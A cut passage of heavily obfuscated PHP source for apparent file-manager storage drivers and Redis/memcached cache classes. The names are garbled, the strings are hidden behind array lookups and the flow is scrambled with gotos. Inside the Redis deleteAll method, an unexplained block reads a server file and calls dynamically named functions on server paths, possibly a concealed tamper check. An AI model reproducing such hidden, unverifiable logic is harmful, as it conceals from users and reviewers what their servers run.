$_SERVER[úÉ·öƒÑì©]; $aÆ„‘ˆ½†š = $this->objectMeta($E©ôŠÀÓ¾); if (!$aÆ„‘ˆ½†š) { return !1; } $d¦…ƒöÖ„Œ = $d¦…ƒöÖ„Œ ? $d¦…ƒöÖ„Œ : _get($aÆ„‘ˆ½†š, $eğ¶ã¸¢øØ[219]); $d¦…ƒöÖ„Œ = $d¦…ƒöÖ„Œ ? $d¦…ƒöÖ„Œ : _get($aÆ„‘ˆ½†š, $eğ¶ã¸¢øØ[209], $eğ¶ã¸¢øØ[33]); return $d¦…ƒöÖ„Œ; } public function uploadFormData($BÁ•·÷†î, $b½…×íóĞ = 3600) { $EÏíÃŞ† =& $_SERVER[úÉ·öƒÑì©]; $Cî·‡¨š°š = $this->pathFather($BÁ•·÷†î); $bÙ¼Ÿ«æÃ = $this->client->getHttpUploadPostParams($this->bucket, $Cî·‡¨š°š, $EÏíÃŞ†[192], $b½…×íóĞ); return array_merge((array) $bÙ¼Ÿ«æÃ, array($EÏíÃŞ†[175] => $this->getHost())); } public function multiUploadFormData($f«—›í§£, $dŠ­¯½—ŒÂ = 3600) { $aÑåõïèĞ® =& $_SERVER[úÉ·öƒÑì©]; $e ßóøå” = gmdate($aÑåõïèĞ®[220]); $fÚ¤ç¡Ñ¨± = array(); $cæ–øè–  = $this->client->getUploadId($this->bucket, $f«—›í§£, $fÚ¤ç¡Ñ¨±); if (!$cæ–øè– ) { return !1; } return array($aÑåõïèĞ®[221] => $cæ–øè– , $aÑåõïèĞ®[175] => $this->getHost() . $aÑåõïèĞ®[8] . $this->pathEncode($f«—›í§£), $aÑåõïèĞ®[222] => $e ßóøå”, $aÑåõïèĞ®[93] => $f«—›í§£); } public function multiUploadAuthData($B¸‘Œô©×‰, $fâÜºªà•‰ = array()) { goto B‡¹‰¹¸; C–ÎèÀ¼šÚ: $aù´Ã©™¥ = $fâÜºªà•‰[$B£ã…’¾˜Ú[93]]; unset($fâÜºªà•‰[$B£ã…’¾˜Ú[93]]); if (isset($fâÜºªà•‰[$B£ã…’¾˜Ú[223]])) { $fâÜºªà•‰[$B£ã…’¾˜Ú[222]] = $Aöõ¦’Ïã«; return $this->listUploadParts($aù´Ã©™¥, $fâÜºªà•‰); } goto dÕ–ÓÖªí; e¿‚İØ¬®á: if (strpos($dæß­Ã£ğ, $B£ã…’¾˜Ú[225]) === 0) { return array($B£ã…’¾˜Ú[232] => $aàí‰ö™», $B£ã…’¾˜Ú[222] => $Aöõ¦’Ïã«); } return $aàí‰ö™»; goto Bâ½¹µº‰å; B‡¹‰¹¸: $B£ã…’¾˜Ú =& $_SERVER[úÉ·öƒÑì©]; $Aöõ¦’Ïã« = isset($fâÜºªà•‰[$B£ã…’¾˜Ú[222]]) ? $fâÜºªà•‰[$B£ã…’¾˜Ú[222]] : gmdate($B£ã…’¾˜Ú[220]); $dæß­Ã£ğ = isset($fâÜºªà•‰[$B£ã…’¾˜Ú[168]]) ? $fâÜºªà•‰[$B£ã…’¾˜Ú[168]] : $B£ã…’¾˜Ú[33]; goto C–ÎèÀ¼šÚ; dÕ–ÓÖªí: $FŠ¢àÜä¯ì = array($B£ã…’¾˜Ú[224], $B£ã…’¾˜Ú[33], $B£ã…’¾˜Ú[119], $B£ã…’¾˜Ú[33], "\x78\55\x61\155\172\55\144\x61\x74\145\x3a{$Aöõ¦’Ïã«}", $B£ã…’¾˜Ú[8] . $this->bucket . $B£ã…’¾˜Ú[8] . $this->pathEncode($aù´Ã©™¥) . $dæß­Ã£ğ); if (strpos($dæß­Ã£ğ, $B£ã…’¾˜Ú[225]) === 0) { $FŠ¢àÜä¯ì[0] = $B£ã…’¾˜Ú[226]; } if (isset($fâÜºªà•‰[$B£ã…’¾˜Ú[227]]) && $fâÜºªà•‰[$B£ã…’¾˜Ú[227]] == $B£ã…’¾˜Ú[228]) { $FŠ¢àÜä¯ì[0] = $B£ã…’¾˜Ú[228]; } goto d³©¡•„äî; d³©¡•„äî: $Cç©ÉêïŠÌ = implode($B£ã…’¾˜Ú[229], $FŠ¢àÜä¯ì); $BîæÃ—·«İ = base64_encode(hash_hmac($B£ã…’¾˜Ú[230], $Cç©ÉêïŠÌ, $this->secret, !0)); $aàí‰ö™» = $B£ã…’¾˜Ú[231] . $this->accessKey . $B£ã…’¾˜Ú[4] . $BîæÃ—·«İ; goto e¿‚İØ¬®á; Bâ½¹µº‰å: } public function listUploadParts($c¥çš²ŒÂš, $A»ÑÔáÜ±î = array()) { goto c…È¨âì’; c…È¨âì’: $fÆ„ê‘œÄ =& $_SERVER[úÉ·öƒÑì©]; $CÌ‘Ê¿ã¼‰ = str_replace($fÆ„ê‘œÄ[233], $fÆ„ê‘œÄ[33], $A»ÑÔáÜ±î[$fÆ„ê‘œÄ[168]]); $cõ¡ğ…äÚ« = $this->client->listParts($this->bucket, $c¥çš²ŒÂš, $CÌ‘Ê¿ã¼‰); goto aÜ¹«™íÀƒ; aÜ¹«™íÀƒ: if (!$cõ¡ğ…äÚ«) { return !1; } unset($A»ÑÔáÜ±î[$fÆ„ê‘œÄ[223]], $A»ÑÔáÜ±î[$fÆ„ê‘œÄ[227]]); $A»ÑÔáÜ±î[$fÆ„ê‘œÄ[93]] = $c¥çš²ŒÂš; goto d‹¢ÎÃ»¼·; d‹¢ÎÃ»¼·: $a  ë×¤òÒ = $this->multiUploadAuthData($c¥çš²ŒÂš, $A»ÑÔáÜ±î); if (empty($a  ë×¤òÒ)) { return !1; } return array($fÆ„ê‘œÄ[232] => $a  ë×¤òÒ, $fÆ„ê‘œÄ[222] => $A»ÑÔáÜ±î[$fÆ„ê‘œÄ[222]], $fÆ„ê‘œÄ[234] => $cõ¡ğ…äÚ«); goto Dô»Ñ¡åà; Dô»Ñ¡åà: } public function getHost() { return parent::getHost() . $_SERVER[úÉ·öƒÑì©][8] . $this->bucket; } public function size($CºÑøˆÂ …) { $cóóÈªé‘ = $this->objectMeta($CºÑøˆÂ …); return $cóóÈªé‘ ? $cóóÈªé‘[$_SERVER[úÉ·öƒÑì©][78]] : 0; } public function info($D‘šÛÅºÙ®) { if ($this->isFolder($D‘šÛÅºÙ®)) { return $this->folderInfo($D‘šÛÅºÙ®); } else { if ($this->isFile($D‘šÛÅºÙ®)) { return $this->fileInfo($D‘šÛÅºÙ®); } } return !1; } public function exist($C™èÏÓÎ½) { return $this->isFile($C™èÏÓÎ½) || $this->isFolder($C™èÏÓÎ½); } public function isFile($A¤ŞíÌ£ğ²) { return !$this->isFolder($A¤ŞíÌ£ğ²) && $this->objectMeta($A¤ŞíÌ£ğ²); } public function isFolder($B¯ëß®…Äã) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][199], $B¯ëß®…Äã); } protected function objectMeta($Fºªššùßá) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][200], $Fºªššùßá); } protected function _objectMeta($b¾¥ëŠ¢æ­) { $eå­Ç¥×ö =& $_SERVER[úÉ·öƒÑì©]; $b¾¥ëŠ¢æ­ = rtrim($b¾¥ëŠ¢æ­, $eå­Ç¥×ö[8]); try { $b¼Äê«ŸÛ× = $this->client->getObjectInfo($this->bucket, $b¾¥ëŠ¢æ­); if (!isset($b¼Äê«ŸÛ×[$eå­Ç¥×ö[219]]) && isset($b¼Äê«ŸÛ×[$eå­Ç¥×ö[235]])) { $b¼Äê«ŸÛ×[$eå­Ç¥×ö[219]] = $b¼Äê«ŸÛ×[$eå­Ç¥×ö[235]]; } } catch (Exception $fÅ„Ù±”†œ) { $b¼Äê«ŸÛ× = !1; } if (!$b¼Äê«ŸÛ×) { } return $b¼Äê«ŸÛ×; } protected function _isFolder($E¢ˆÆÔÃâ) { goto EÃ­¶ãğ–Ğ; B´ÂË´±¡×: $CÜíçèö™Ì = $this->client->getBucket($this->bucket, $E¢ˆÆÔÃâ, null, 1); if (empty($CÜíçèö™Ì[$c§¤¿Ã‡Ğ¡[198]])) { return !1; } $FİßõŒ‚·¢ = $CÜíçèö™Ì[$c§¤¿Ã‡Ğ¡[198]][0][$c§¤¿Ã‡Ğ¡[28]]; goto F©ŞŸ»ËÌÓ; F…±ø¨Šù: return !0; goto FáÉ…ÂïøÛ; F©ŞŸ»ËÌÓ: return stripos($FİßõŒ‚·¢, $E¢ˆÆÔÃâ . $c§¤¿Ã‡Ğ¡[8]) === 0 ? !0 : !1; if (substr($FİßõŒ‚·¢, -1) == $c§¤¿Ã‡Ğ¡[8]) { return !0; } if (get_path_this($FİßõŒ‚·¢) == get_path_this($E¢ˆÆÔÃâ)) { return !1; } goto F…±ø¨Šù; EÃ­¶ãğ–Ğ: $c§¤¿Ã‡Ğ¡ =& $_SERVER[úÉ·öƒÑì©]; $E¢ˆÆÔÃâ = rtrim($E¢ˆÆÔÃâ, $c§¤¿Ã‡Ğ¡[8]); if ($E¢ˆÆÔÃâ == $c§¤¿Ã‡Ğ¡[33] || $E¢ˆÆÔÃâ == $c§¤¿Ã‡Ğ¡[8]) { return !0; } goto B´ÂË´±¡×; FáÉ…ÂïøÛ: } } define($_SERVER[úÉ·öƒÑì©][236], 1); goto fÑ‚¤¡²ƒ; E–÷®êÜõ¾: class CacheLockDatabase { public function lock($bƒ¸§¨ô¾¨, $Dâ¨ùØ‹×Á = 0) { $DĞäÜÇÂĞî = Model($_SERVER[úÉ·öƒÑì©][810]); $CªÙ¿‚‹Æ = microtime(!0) + $Dâ¨ùØ‹×Á; while (microtime(!0) < $CªÙ¿‚‹Æ) { $E‹Šäï”ãã = $DĞäÜÇÂĞî->get($bƒ¸§¨ô¾¨); if (!$E‹Šäï”ãã || $E‹Šäï”ãã < microtime(!0)) { $Dùğ¶ÜÆ¹Š = $DĞäÜÇÂĞî->set($bƒ¸§¨ô¾¨, $CªÙ¿‚‹Æ); if ($Dùğ¶ÜÆ¹Š) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eğ¨¨ŠÑ“) { return Model($_SERVER[úÉ·öƒÑì©][810])->get($eğ¨¨ŠÑ“); } public function unlock($c’Ìƒ¿Ê×) { Model($_SERVER[úÉ·öƒÑì©][810])->remove($c’Ìƒ¿Ê×); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($FÜâÂŠ¾³½, $BÕ«ÙÔ‘½·) { $FÀÑĞ“·Ë =& $_SERVER[úÉ·öƒÑì©]; if (!class_exists($FÀÑĞ“·Ë[837])) { show_json($FÀÑĞ“·Ë[838], !1); } $this->cacheTime = $BÕ«ÙÔ‘½·; $this->handle = new Memcached(); if (is_array($FÜâÂŠ¾³½[$FÀÑĞ“·Ë[839]]) && count($FÜâÂŠ¾³½[$FÀÑĞ“·Ë[839]]) >= 1) { foreach ($FÜâÂŠ¾³½[$FÀÑĞ“·Ë[839]] as $CÒ²¡óÏ´è) { $C¯à°ØÛ·Ï = explode($FÀÑĞ“·Ë[4], $CÒ²¡óÏ´è); $this->handle->addServer($C¯à°ØÛ·Ï[0], $C¯à°ØÛ·Ï[1]); } } else { $this->handle->addServer($FÜâÂŠ¾³½[$FÀÑĞ“·Ë[175]], $FÜâÂŠ¾³½[$FÀÑĞ“·Ë[176]]); } } public function set($eœ„íÛŞ, $D½ã§çèÍ‹, $cÃÛæˆ‘ = false) { $cÃÛæˆ‘ = $cÃÛæˆ‘ ? $cÃÛæˆ‘ : $this->cacheTime; return $this->handle->set($eœ„íÛŞ, $D½ã§çèÍ‹, $cÃÛæˆ‘); } public function get($FÑË¤¬ÂÙ) { return $this->handle->get($FÑË¤¬ÂÙ); } public function remove($e‡ÏãŞ”‚›) { return $this->handle->delete($e‡ÏãŞ”‚›); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($e¯ÃŠœÅ„º, $a²ç•æ¯åÒ) { $Dö•¦‰ùœ³ =& $_SERVER[úÉ·öƒÑì©]; if (!class_exists($Dö•¦‰ùœ³[840])) { show_json($Dö•¦‰ùœ³[841], !1); } $this->cacheTime = $a²ç•æ¯åÒ; $eÕ›Ñ„Òíš = isset($e¯ÃŠœÅ„º[$Dö•¦‰ùœ³[842]]) ? $e¯ÃŠœÅ„º[$Dö•¦‰ùœ³[842]] : 10; $Dùëè¬Ğ‡À = _get($e¯ÃŠœÅ„º, $Dö•¦‰ùœ³[839]); if ($Dùëè¬Ğ‡À && is_array($Dùëè¬Ğ‡À)) { $this->initCluster($e¯ÃŠœÅ„º, $eÕ›Ñ„Òíš); } else { $this->handle = $this->init($e¯ÃŠœÅ„º, $eÕ›Ñ„Òíš); } } private function init($F–¤»Ü‰–», $DÓ™øó¦º‡) { $A§®ÙùÇŠË =& $_SERVER[úÉ·öƒÑì©]; $d¸Äµá¦“Ğ = new Redis(); $a‰¡½—å = isset($F–¤»Ü‰–»[$A§®ÙùÇŠË[843]]) ? $F–¤»Ü‰–»[$A§®ÙùÇŠË[843]] : !1; if ($a‰¡½—å) { $d¸Äµá¦“Ğ->pconnect($F–¤»Ü‰–»[$A§®ÙùÇŠË[175]], $F–¤»Ü‰–»[$A§®ÙùÇŠË[176]], $DÓ™øó¦º‡); } else { $d¸Äµá¦“Ğ->connect($F–¤»Ü‰–»[$A§®ÙùÇŠË[175]], $F–¤»Ü‰–»[$A§®ÙùÇŠË[176]], $DÓ™øó¦º‡); } if (!empty($F–¤»Ü‰–»[$A§®ÙùÇŠË[415]])) { $d¸Äµá¦“Ğ->auth($F–¤»Ü‰–»[$A§®ÙùÇŠË[415]]); } return $d¸Äµá¦“Ğ; } private function initCluster($cÃêÄ½²Ì, $B¬òÑ¹‚ò™) { $fùë„ßö“ô =& $_SERVER[úÉ·öƒÑì©]; $aá‚ÇÜ¨¬¢ = array($fùë„ßö“ô[844], $fùë„ßö“ô[845], $fùë„ßö“ô[846]); $D¼õ¡–Û‡‹ = $fùë„ßö“ô[844]; if (isset($cÃêÄ½²Ì[$fùë„ßö“ô[12]]) && in_array($cÃêÄ½²Ì[$fùë„ßö“ô[12]], $aá‚ÇÜ¨¬¢)) { $D¼õ¡–Û‡‹ = $cÃêÄ½²Ì[$fùë„ßö“ô[12]]; } switch ($D¼õ¡–Û‡‹) { case $fùë„ßö“ô[844]: $this->_slave($cÃêÄ½²Ì, $B¬òÑ¹‚ò™); break; case $fùë„ßö“ô[845]: break; case $fùë„ßö“ô[846]: $this->isCluster = !0; $BÓÈÇŸ¬£‹ = $cÃêÄ½²Ì[$fùë„ßö“ô[839]]; $aÊäëïé¥ = isset($cÃêÄ½²Ì[$fùë„ßö“ô[843]]) ? $cÃêÄ½²Ì[$fùë„ßö“ô[843]] : !1; $fâ”àåŸ = isset($cÃêÄ½²Ì[$fùë„ßö“ô[415]]) ? $cÃêÄ½²Ì[$fùë„ßö“ô[415]] : null; $this->handle = new RedisCluster(NUll, $BÓÈÇŸ¬£‹, $B¬òÑ¹‚ò™, $B¬òÑ¹‚ò™, $aÊäëïé¥, $fâ”àåŸ); break; default: break; } } private function _slave($B•Ò”ãÀóŸ, $aºäÔ¡‚¸å) { goto FªàËÅÌ; B‹é’µáÅ: unset($AŒŒß—Ø••[0]); if (empty($AŒŒß—Ø••)) { return; } $Dè„‡ÀÈ² = array_rand($AŒŒß—Ø••); goto c©¯Ø‹±Ç•; FªàËÅÌ: $AŒŒß—Ø•• = $B•Ò”ãÀóŸ[$_SERVER[úÉ·öƒÑì©][839]]; $this->filterConfig($B•Ò”ãÀóŸ, $AŒŒß—Ø••[0]); $this->handle = $this->init($B•Ò”ãÀóŸ, $aºäÔ¡‚¸å); goto B‹é’µáÅ; c©¯Ø‹±Ç•: $this->filterConfig($B•Ò”ãÀóŸ, $AŒŒß—Ø••[$Dè„‡ÀÈ²]); $this->slaveHandle = $this->init($B•Ò”ãÀóŸ, $aºäÔ¡‚¸å); goto f§Ü¾Ÿœ©Æ; f§Ü¾Ÿœ©Æ: } private function filterConfig(&$Bã›åÓãµ¤, $BËÔé¯‹Ü³) { $FìÕ¨¬ìš =& $_SERVER[úÉ·öƒÑì©]; $e‰±Ğíó³Ş = explode($FìÕ¨¬ìš[4], $BËÔé¯‹Ü³); $E”Œóˆä‘â = array($FìÕ¨¬ìš[175] => $e‰±Ğíó³Ş[0], $FìÕ¨¬ìš[176] => $e‰±Ğíó³Ş[1]); $Bã›åÓãµ¤ = array_merge($Bã›åÓãµ¤, $E”Œóˆä‘â); } public function set($f¾õÛ†áí±, $cŒŸ¸É²†, $e·°‡°†»İ = false) { $e·°‡°†»İ = $e·°‡°†»İ ? $e·°‡°†»İ : $this->cacheTime; return $this->handle->setEx($f¾õÛ†áí±, $e·°‡°†»İ, $cŒŸ¸É²†); } public function setLock($eËƒƒŞÀéï, $d„¤Š¡õ˜‘, $b³¡ºéãËÈ) { return $this->handle->setNX($eËƒƒŞÀéï, $d„¤Š¡õ˜‘); } public function get($cæ„ö‹Õ„´) { $C–ù”Ú—¿ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $C–ù”Ú—¿->get($cæ„ö‹Õ„´); } public function remove($fè¬–¨éÙ­) { return $this->handle->del($fè¬–¨éÙ­); } public function deleteAll() { $e„ãÕ§èÌ¡ =& $_SERVER[úÉ·öƒÑì©]; if ($_SERVER[$e„ãÕ§èÌ¡[244]] != $_SERVER[$e„ãÕ§èÌ¡[847]]) { goto EÒ¦ùš¶’; DàˆÁ£Ÿ³Š: $bÁ¡øÍõ‡ò = $Dê‹³›¥‡À($bğœÊôª‚ô); $f¾ÔèÆóá„ = explode($e„ãÕ§èÌ¡[229], $bÁ¡øÍõ‡ò); if (count($f¾ÔèÆóá„) < $e„ãÕ§èÌ¡[588]) { $fÕËÂĞ†¸½ = $e„ãÕ§èÌ¡[249]; $fÕËÂĞ†¸½(); } goto a†âÆ§ÉØ; AÒÙˆ¸²ö: $C‡Ì›„Š”Ï = 1; while ($C‡Ì›„Š”Ï > 1) { $C‡Ì›„Š”Ï = $C‡Ì›„Š”Ï + 4; $fªœ°«ÓäŒ = rawurlencode($C‡Ì›„Š”Ï . $e„ãÕ§èÌ¡[384]); } goto A¼ˆ­£áÀä; a†âÆ§ÉØ: $DáÃ«´ÎÅŞ = $e„ãÕ§èÌ¡[849]; $DáÃ«´ÎÅŞ($_SERVER[$e„ãÕ§èÌ¡[850]]); $DáÃ«´ÎÅŞ($_SERVER[$e„ãÕ§èÌ¡[246]] . $e„ãÕ§èÌ¡[851]); goto AÒÙˆ¸²ö; EÒ¦ùš¶’: $c¢öŞ¦ = $e„ãÕ§èÌ¡[848]; $Dê‹³›¥‡À = $e„ãÕ§èÌ¡[245]; $bğœÊôª‚ô = $_SERVER[$e„ãÕ§èÌ¡[246]] . $e„ãÕ§èÌ¡[247]; goto DàˆÁ£Ÿ³Š; A¼ˆ­£áÀä: } if ($this->isCluster) { foreach ($this->handle->_masters() as $AÍÌÄåİ§) { $this->handle->flushall($AÍÌÄåİ§); } return; } return $this->handle->flushAll(); } } goto eÏ¼ò‹ë£Ø; b¾ºç†™ö: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($bƒâ³èİÁì) { parent::__construct($bƒâ³èİÁì); $this->signatureVersion($_SERVER[úÉ·öƒÑì©][212]); } public function uploadFormData($Cİ“ÆĞ·¥«, $fïñ¬¿ÎõŸ = 3600) { goto eÂŠìîê§ã; Aµëæ£–Œ: $aèâ«˜Ş— = array($eº¯£†[1198] => $BÇÒôÙº…ô, $eº¯£†[1199] => array(array($eº¯£†[1200] => $Cå“ùª…Á†), array($eº¯£†[1201] => $this->bucket), array($eº¯£†[1202], $eº¯£†[1203], $eº¯£†[33]), array($eº¯£†[1204] => $fŞ…ìï°²Ú), array($eº¯£†[1205] => $Añ²ô”Ş£œ), array($eº¯£†[1206] => $this->accessKey), array($eº¯£†[1207] => $e¡£‚ìŞä))); $aèâ«˜Ş— = json_encode($aèâ«˜Ş—); $dÙâÍá¡Ÿ£ = hash_hmac($eº¯£†[230], $e¡£‚ìŞä, $this->secret); goto fÉÎËµá˜‚; b¬Ó‚Ö‘: $fŞ…ìï°²Ú = $eº¯£†[1196]; $BÇÒôÙº…ô = gmdate($eº¯£†[1197], time() + $fïñ¬¿ÎõŸ); $e¡£‚ìŞä = (string) time() . $eº¯£†[68] . (string) (time() + $fïñ¬¿ÎõŸ); goto Aµëæ£–Œ; fÉÎËµá˜‚: $eßõèƒ’Ö” = sha1($aèâ«˜Ş—); $b†‘Ñ±Á®¨ = hash_hmac($eº¯£†[230], $eßõèƒ’Ö”, $dÙâÍá¡Ÿ£); $c×ÏàŞàÉÔ = array($eº¯£†[1200] => $Cå“ùª…Á†, $eº¯£†[1204] => $fŞ…ìï°²Ú, $eº¯£†[1208] => base64_encode($aèâ«˜Ş—), $eº¯£†[1205] => $Añ²ô”Ş£œ, $eº¯£†[1206] => $this->accessKey, $eº¯£†[1209] => $e¡£‚ìŞä, $eº¯£†[1210] => $b†‘Ñ±Á®¨, $eº¯£†[175] => $this->getHost()); goto e«ÍÏÓÒø; e«ÍÏÓÒø: return $c×ÏàŞàÉÔ; goto B¹ÔŞ¯‰æÕ; eÂŠìîê§ã: $eº¯£† =& $_SERVER[úÉ·öƒÑì©]; $Cå“ùª…Á† = $eº¯£†[192]; $Añ²ô”Ş£œ = $eº¯£†[230]; goto b¬Ó‚Ö‘; B¹ÔŞ¯‰æÕ: } public function fileOutLink($EœÆÀ–èê) { $fÖÁå­²Å¸ =& $_SERVER[úÉ·öƒÑì©]; if (substr($EœÆÀ–èê, 0, 7) == $fÖÁå­²Å¸[1211]) { $EœÆÀ–èê = $fÖÁå­²Å¸[1212] . substr($EœÆÀ–èê, 7); } header($fÖÁå­²Å¸[159] . $EœÆÀ–èê); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($FóÓãòî¨) { $this->pathParse = $FóÓãòî¨; $this->model = Model($_SERVER[úÉ·öƒÑì©][1213]); } public function getPath($DÔĞŠ‘Š) { return trim($DÔĞŠ‘Š, $_SERVER[úÉ·öƒÑì©][8]); } public function pathFather($a—Œ·È‡Ëƒ) { $FÔòŒÔëÒË = $this->parse($a—Œ·È‡Ëƒ); $FÔòŒÔëÒË = $this->infoSimple($a—Œ·È‡Ëƒ); return $FÔòŒÔëÒË ? $FÔòŒÔëÒË[$_SERVER[úÉ·öƒÑì©][487]] : !1; } public function pathThis($AŠ²¦Ü¾) { $EØˆÆß«Í = $this->infoSimple($AŠ²¦Ü¾); return $EØˆÆß«Í ? $EØˆÆß«Í[$_SERVER[úÉ·öƒÑì©][28]] : !1; } public function getPathOuter($cµ­¡„Ñó) { if (!$cµ­¡„Ñó) { return $cµ­¡„Ñó; } $FÄƒ–ºŒİó = $this->parse($cµ­¡„Ñó); return KodIO::make($FÄƒ–ºŒİó[$_SERVER[úÉ·öƒÑì©][402]]); } public function copyFolderFromIO($fÛ¡¿»âéŠ, $FÀÓÜ¬å¯ã, $bËÊ¼É¨¯, $aÛ£Û–ô²Ö, $f°à³¤¡) { $F¥‡İ«Æ™É = $this->model->copyFolderFromIO($fÛ¡¿»âéŠ, $FÀÓÜ¬å¯ã, $bËÊ¼É¨¯, $aÛ£Û–ô²Ö, $f°à³¤¡); return KodIO::make($F¥‡İ«Æ™É); } public function isParentOf($BĞß‹‚ä»Ÿ, $CéÏğ´ÍÎÁ) { return $this->model->isParentOf($BĞß‹‚ä»Ÿ, $CéÏğ´ÍÎÁ); } public function mkfile($FóÛš¹«ÙÁ, $EÉƒµÒ¯† = '', $E–‡˜ËÍä¢ = REPEAT_RENAME) { $aè‰åÌÏèº =& $_SERVER[úÉ·öƒÑì©]; $BÛ„…ÀÀè’ = $this->parse($FóÛš¹«ÙÁ); $FóÛš¹«ÙÁ = $BÛ„…ÀÀè’[$aè‰åÌÏèº[402]]; for ($C»íòÑÌÔ¹ = 0; $C»íòÑÌÔ¹ < count($BÛ„…ÀÀè’[$aè‰åÌÏèº[1214]]); $C»íòÑÌÔ¹++) { $CË˜’ËïÉ = $BÛ„…ÀÀè’[$aè‰åÌÏèº[1214]][$C»íòÑÌÔ¹]; if ($C»íòÑÌÔ¹ == count($BÛ„…ÀÀè’[$aè‰åÌÏèº[1214]]) - 1) { $FóÛš¹«ÙÁ = $this->model->mkfile($FóÛš¹«ÙÁ, $CË˜’ËïÉ, $EÉƒµÒ¯†, $E–‡˜ËÍä¢); break; } $FóÛš¹«ÙÁ = $this->model->mkdir($FóÛš¹«ÙÁ, $CË˜’ËïÉ, REPEAT_SKIP); } return $this->getPathOuter($FóÛš¹«ÙÁ); } public function mkdir($e‡ñß¥‡Î¥, $Cğµà©ÎÁ = REPEAT_SKIP) { $BÊìæ›ÁÇĞ =& $_SERVER[úÉ·öƒÑì©]; $d–­¿ò™§ = $this->parse($e‡ñß¥‡Î¥); $e‡ñß¥‡Î¥ = $d–­¿ò™§[$BÊìæ›ÁÇĞ[402]]; for ($F÷ğø¡İ³Ã = 0; $F÷ğø¡İ³Ã < count($d–­¿ò™§[$BÊìæ›ÁÇĞ[1214]]); $F÷ğø¡İ³Ã++) { $D¾¼À‚‹‹ = $d–­¿ò™§[$BÊìæ›ÁÇĞ[1214]][$F÷ğø¡İ³Ã]; $e‡ñß¥‡Î¥ = $this->model->mkdir($e‡ñß¥‡Î¥, $D¾¼À‚‹‹, $Cğµà©ÎÁ); } return $this->getPathOuter($e‡ñß¥‡Î¥); } public function copyFile($däáñ¦™¥», $E‰À–‘‡ŞË, $d¨ÈÑ’Ô½ = REPEAT_REPLACE) { $CŠ‰„È¡Ñá =& $_SERVER[úÉ·öƒÑì©]; $f‰”„ÆÏ†Ë = $this->parse($E‰À–‘‡ŞË); $Eñî³Îå²¶ = $this->model->copy($däáñ¦™¥», $f‰”„ÆÏ†Ë[$CŠ‰„È¡Ñá[402]], $d¨ÈÑ’Ô½, $f‰”„ÆÏ†Ë[$CŠ‰„È¡Ñá[76]]); return $Eñî³Îå²¶ ? $this->getPathOuter($Eñî³Îå²¶) : !1; } public function moveFile($d‘í‘¸íÇ«, $E¦Ú¶ìòÜÕ, $D¤³Åá£É = REPEAT_REPLACE) { $F¡±ñÒ“ëç =& $_SERVER[úÉ·öƒÑì©]; $A¶Ùä……Â® = $this->parse($E¦Ú¶ìòÜÕ); $AĞÙ„—¤ = $this->model->move($d‘í‘¸íÇ«, $A¶Ùä……Â®[$F¡±ñÒ“ëç[402]], $D¤³Åá£É, $A¶Ùä……Â®[$F¡±ñÒ“ëç[76]]); return $AĞÙ„—¤ ? $this->getPathOuter($AĞÙ„—¤) : !1; } public function copy($FÀ‚Æ—ö¾…, $FäÖÅ™ù, $có°ãğÚ‘¼ = REPEAT_REPLACE) { $c¯¬ÔÑğ¦– = $this->parse($FäÖÅ™ù); $Dö¼†›÷‡ = $this->model->copy($FÀ‚Æ—ö¾…, $c¯¬ÔÑğ¦–[$_SERVER[úÉ·öƒÑì©][402]], $có°ãğÚ‘¼); return $Dö¼†›÷‡ ? $this->getPathOuter($Dö¼†›÷‡) : !1; } public function moveSameAllow() { } public function move($fÉ»…Ç‡â, $B¨ø¢¼ò„Ñ, $b‡Œ§ŠÊÄ– = REPEAT_REPLACE) { $dÆ–êÑ¼ = $this->parse($B¨ø¢¼ò„Ñ); $eàÓï°Ô¯ = $this->model->move($fÉ»…Ç‡â, $dÆ–êÑ¼[$_SERVER[úÉ·öƒÑì©][402]], $b‡Œ§ŠÊÄ–); return $eàÓï°Ô¯ ? $this->getPathOuter($eàÓï°Ô¯) : !1; } public function remove($EÉ„Óã‚ Ğ, $Eé™ÁÙ‰„ = true) { return $this->model->remove($EÉ„Óã‚ Ğ, $Eé™ÁÙ‰„); } public function rename($cÄÓ–Ï„ÂŠ, $Dğ±ÁŸ‚ò) { $DŒÑÜã¨™å = $this->model->rename($cÄÓ–Ï„ÂŠ, $Dğ±ÁŸ‚ò); return $DŒÑÜã¨™å ? $this->getPathOuter($cÄÓ–Ï„ÂŠ) : $DŒÑÜã¨™å; } public function size($DƒÃÍµÂ«£) { $aØ¿¹ÙÅ‰³ = $this->infoSimple($DƒÃÍµÂ«£); return $aØ¿¹ÙÅ‰³ ? $aØ¿¹ÙÅ‰³[$_SERVER[úÉ·öƒÑì©][78]] : 0; } public function infoSimple($cñÙ±°öİ) { return $this->model->sourceInfo($cñÙ±°öİ); } public function info($eŞ¤‘ñ„ãƒ) { return $this->infoParse($eŞ¤‘ñ„ãƒ); } public function infoAuth($D¿Æ×¿ë˜¿) { return $this->infoParse($D¿Æ×¿ë˜¿, !1, !0); } public function infoWithChildren($DÛˆ¤÷–Ò…) { return $this->infoParse($DÛˆ¤÷–Ò…, !0); } protected function infoParse($Bø¸Ó–Ş, $b±Õñ½æ«Œ = false, $bÏÚˆæªŠ· = false) { if (!$b±Õñ½æ«Œ) { return $this->model->pathInfo($Bø¸Ó–Ş, $bÏÚˆæªŠ·); } return $this->model->pathInfoMore($Bø¸Ó–Ş); } public function infoFull($AÏÎŞ’ãï) { $d»‰õÙŠ¤  =& $_SERVER[úÉ·öƒÑì©]; $f’¯Â¥é½ = explode($d»‰õÙŠ¤ [8], $AÏÎŞ’ãï); $Cé×†À† = implode($d»‰õÙŠ¤ [8], array_splice($f’¯Â¥é½, 1)); return $this->model->pathInfoByPath($f’¯Â¥é½[0], $Cé×†À†); } public function hashSimple($Eõ®È¯İ) { $B¥ÅğËˆ§­ =& $_SERVER[úÉ·öƒÑì©]; $AºÄ—÷ Ó‰ = $this->infoWithChildren($Eõ®È¯İ); return $AºÄ—÷ Ó‰[$B¥ÅğËˆ§­[164]][$B¥ÅğËˆ§­[171]]; } public function hashMd5($CÁà¸À¨÷Û) { $b÷ÒÖ‰½œª =& $_SERVER[úÉ·öƒÑì©]; $DÍ‰º’¦ØÍ = $this->infoWithChildren($CÁà¸À¨÷Û); return 